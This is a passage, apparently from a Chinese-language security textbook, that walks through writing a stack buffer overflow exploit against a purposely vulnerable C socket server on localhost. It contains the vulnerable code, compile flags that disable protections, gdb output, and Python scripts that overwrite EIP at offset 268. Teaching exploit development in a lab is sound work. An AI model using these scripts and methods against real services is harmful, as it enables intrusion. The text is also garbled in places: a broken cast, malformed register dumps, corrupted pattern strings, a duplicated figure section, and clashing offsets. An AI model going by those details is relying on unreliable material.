
```c
{
  perror("Socket Creation Failed");
  exit(errno);
  bzero(&self, sizeof(self));
  // Listen on all adapters on port 8000
  self.sin_family = AF_INET;
  self.sin_port = htons(8000);
  self.sin_addr.s_addr = INADDR_ANY;
  // bind the socket to the system
  if ( bind(fd, (struct sockaddr*&self, sizeof(self)) != 0 ) {
    perror("Bind Failed");
    exit(errno);
  }
  // listen for incoming connections (max 5)
  if ( listen(fd, 5) != 0 ) {
    perror("Listen Failed");
    exit(errno);
  }
  while (1) {
    int c;
    struct sockaddr_in client_addr;
    int addrlen=sizeof(client_addr);
    size_t size = 0;
    // accept a client connection
    c = accept(fd, (struct sockaddr*)&client_addr, &addrlen);
    // empty the buffer and print out the ESP value
    bzero(buf,sizeof(buf));
    sprintf(buf, "ESP is at %08x\nDATA:", getesp(0));
    send(c, buf, strlen(buf), 0);
    // Read in the input from the user
    bzero(buf, sizeof(buf));
    recv(c, buf, 2048, 0);
    // Take the buffer and send it to the vulnerable function
    crash(buf,c);
    close(c);
  }
  close(fd);
  return 0;
}
```

现在我们的代码已经保存了，我们需要安装一些额外的程序来完成编译。为此，我们执行命令 `apt-get install build-essential libc6-dev-i386`。这将确保我们的编译器和支持程序已安装。完成后，我们需要编译我们的漏洞程序。为了做到这一点，我们执行命令 `gcc -ggdb -fno-stack-protector -z execstack -m32 -o vuln vuln.c`。

对于这个命令，`-ggdb` 意味着包含调试符号，这样我们就能在 `gdb` 中看到函数调用。参数 `fno-stack-protector` 禁用了栈金丝（stack canary），这样我们可以溢出栈而不会导致应用程序崩溃。为了允许可执行栈，我们使用参数 `-z execstack`。最后，我们希望让其成为 32 位应用程序，因此我们添加了标志 `-m32`。`-o` 参数指定输出文件。这将我们的二进制文件编译为 32 位二进制文件，并具有可执行栈、无栈金丝，且包含调试符号。

## 设置调试

接下来，我们需要设置调试，以便我们看到程序发生了什么什么。在终端中，我们将执行命令 `gdb --quiet ./vuln`，这将在 GNU 调试器中执行我们的程序 `vuln`，而不打印启动横幅。如图 9.1 所示，在提示符处输入 `r` 将运行我们的程序。`r` 是 `run`（运行）的缩写，任一命令都有效，但在调试时经常需要简洁。

文件 编辑 查看 搜索 终端 帮助

```bash
root@kali:~# gdb --quiet ./vuln
Reading symbols from ./vuln...done.
(gdb) r
Starting program: /root/vuln
CX
Program received signal SIGINT, Interrupt.
0xf7ffdc00 in __kernel_vsyscall ()
(gdb) i r
eax             0xffffff00      -512
cx             0xffffffc0      -13280
dx             0xff7faae00      -1345536000
ebx             0x5               0
esp             0xffffff0c
ebp             0xffffff4d8
si              0x0               0xffffff4d8
edi             0x0
eip             0xf7fdcc00      <_kernel_vsyscall+16>
flags           0x296             [ PF AF SF IF ]
cs              0x23              35
ss              0x2b              43
ds              0x2b              43
es              0x2b              43
fs              0x0
g               0x63              99
```

# 图 9.1 启动调试器。

在我们运行程序后，我们想要检查程序的状态。通过按下 "CTRL+c"，我们将中断程序的执行。我们可以看到程序接收到了 "SIGINT" 信号，这意味着由于按下 "CTRL+c" 引起的中断信号。一旦程序停止，我们就执行命令 `i r`。该命令是 `info registers`（显示寄存器）的缩写，它将显示每个寄存器的值。在利用之前知道这些值的样子是有用的，这样我们就能看到利用期间发生了什么变化。

脚本：我们创建了一个 socket，然后将主机名设置为 localhost 的 IP 地址，并将端口设置为 8000。接下来，我们调用 `connect` 函数并指定主机和端口，这将我们连接到远程主机。对于我们的示例，我们将在连接后接收发送给我们的数据，发送 10 个 A 字符，然后接收数据并关闭 socket。

为了在我们的服务器上运行代码，我们需要重启 GDB。通过这种方式，我们使用“r”命令进行运行，如果想要重启，则回答 yes。我们将代码保存为 `exp.py`，当我们在新窗口中运行代码时，它的显示应该与图 9.3 相似。

```
File Edit View Search Terminal Help
root@kali:/tmp# python exp.py
ESP is at fffffcc2
DATA:
AAAAAAAA
root@kali:/tmp# █
```

## 9.3 执行我们的第一次漏洞利用。

当我们连接到应用程序时，它会告诉我们当前的 ESP 在哪里。接着它会请求数据，然后它会将我们提供的输出打印回来。这个例子对于熟悉漏洞利用来说超级简单。通常情况下你必须自己找出 ESP，而且程序可能不会那么容易崩溃。然而，我们的下一步是弄清楚要发送多少数据才能使其崩溃。为了做到这一点，我们将调整发送给程序的 A 字符数量。从 100 个 A 开始，不断增加发送的 A 的数量，直到 GDB 告诉你出现问题为止。当你达到 3000 个 A 时，你应该能看到与图 9.4 类似的输出。

```
root@kali:/tmp# ./exp.py
ESP is at fffccc28
DATA:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root@kali:/tmp# 
```

```
File Edit View Search Terminal Help
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```

## 图 9.4 我们使用漏洞程序的第一次崩溃。

我们注意到当前的执行行是 `0x41414141`，这在 ASCII 中是 "AAAA"。我们在这里看到了当前指令通常所在的位置，但相反，我们用 A 覆盖了 EIP。我们获得了一个很有趣的崩溃，因为控制 EIP 允许我们控制应用程序流。我们需要确定在我们的系列字符串中，EIP 是哪里被覆盖的。

## 使用 pattern_offset

Metasploit 有两个在漏洞开发过程中经常使用的辅助脚本。第一个是 `pattern_create.rb`，可以在 `/usr/share/metasploit-framework/tools/exploit/` 找到。该脚本接受一个参数：我们想要创建的缓冲区长度。第二个是 `pattern_offset.rb`，该工具将接收来自 `pattern_create.rb` 的输出并返回应用程序崩溃时 EIP 的位置。通过将 2048 指定为 `pattern_create` 的长度，我们可以生成一个字符串，用该字符串来寻找 EIP 覆盖的精确长度，并更好地了解缓冲区中存储了多少数据以备后之用。该字符串包含唯一序列的字符，这允许我们将 EIP 的值输入到另一个脚本中，以确定 EIP 被覆盖的精确长度。我们获取 `pattern_create` 输出的字符串并将其放入 `buf` 变量中。

```python
#!/usr/bin/python evenimport socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
s.connect((host, port))
print(s.recv(1024))
buf="Aa0a1Aa2Aa3Aa4Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab8"
s.send(buf)
print(s.recv(1024))
s.close # Close the socket when done
```

我们的新代码替换了原始脚本中的 A。我们在 gdb 中通过输入“r”再次重新启动程序，然后运行我们新的 `exp.py`。我们可以在图 9.5 中看到结果，我们返回了部分代码作为输出，并看到 EIP 被不同的值覆盖了。

```
File Edit View Search Terminal Help

ESP is fffff28
DATA:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ab0Ac1Ac2Ac3Ac4Ac5Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ad0Ae0Ae1Ae2Ae3Ae4Ae5Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2
Af3F4F1F2F3F4F5F6F7F8F9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9
0011223Ja4Ja5Ja6Ja7Ja8Ja9Ja0Ka1Ka2Ka3Ka4Ka5Ka6Ka7Ka8Ka9Ka0La1La2La3La4La5La6La7La8La9La0An1An2An3An4An5An6An7An8An9An0Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bb0Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9C0Dd0D1D2D3D4D5D6D7D8D9D0D0De0De2De2De3De4De5D6D7D8D9D0Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9F0Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9G0G0G1G2G3G4G5G6G7G8G9G0H0H1H2H3H4H5H6H7H8H9H0J0J1J2J3J4J5J6J7J8J9J0K0K1K2K3K4K5K6K7K8K9K0L0L1L2L3L4L5L6L7L8L9L0N0N1N2N3N4N5N6N7N8N9N0
```

```
File Edit View Search Terminal Help
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/vuln

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 
```

## 图 9.4 我们使用漏洞程序的第一次崩溃。

我们注意到当前的执行行是 `0x41414141`，这在 ASCII 中是 "AAAA"。我们在这里看到了当前指令通常所在的位置，但相反，我们用 A 覆盖了 EIP。我们获得了一个很有趣的崩溃，因为控制 EIP 允许我们控制应用程序流。我们需要确定在我们的系列字符串中，EIP 是哪里被覆盖的。

## 9.5 使用偏移量值确定 EIP 的位置

我们的下一步是解释这些数据。我们将通过 `pattern_offset.rb` 来完成，我们将生成的第一个字符串返回给我们，并查看 EIP。

```
root@kali:~ pattern_offset.rb
[*] match at offset 220
root@kali:~ pattern_offset.rb
[*] match at offset 268
```

我们看到字符串长度位于 1020。当加上 4 个字符时，我们程序读取的缓冲区长度为 1024。现在查看 EIP，它在 268 字节处被覆盖。

## 控制 EIP

现在我们知道 EIP 需要覆盖多少字符。我们需要验证我们的操作是正确的。我们通过构建漏洞来实现这一点，使得原始字符为 A，EIP 由 B 组成，漏洞缓冲剩余部分由 C 组成。

```python
#!/usr/bin/python
import socket
s = socket.socket()
host = '127.0.0.1'
port = 8000
eip = "BBBB"
buf = "A"*268 + eip
buf += "C"*(1024-len(buf))
s.connect((host, port))
print(s.recv(1024))
s.send(buf)
print(s.recv(1024))
s.close()
```

我们的新代码将 EIP 值设置为“BBBB”，然后创建一个 268 个字符的漏洞缓冲区，EIP 覆盖，然后用 C 填充 1024 长度的缓冲区。当我们在 gdb 中重启程序并运行新代码时，我们应该看到与图 9.6 类似的输出。
